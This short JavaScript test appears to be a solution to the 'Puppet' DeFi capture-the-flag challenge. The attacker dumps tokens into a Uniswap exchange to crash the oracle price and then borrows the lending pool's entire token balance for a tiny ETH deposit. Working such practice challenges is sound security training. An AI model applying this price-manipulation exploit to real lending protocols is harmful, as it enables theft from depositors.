...
describe('[Challenge] Puppet', function () {
    ...
    it('Exploit', async function () {
        ...
        //Swap tokens for eth to lower price
        //Borrow everything
        //Sell for fun and profit

        const later = (new Date()).getTime() + (60 * 60 * 24 * 10)
        await this.token.connect(attacker).approve(this.uniswapExchange.address, ethers.utils.parseEther('1000000000'))
        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE.sub(1), 1, later);
        
        const required = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, {value: required})
    });
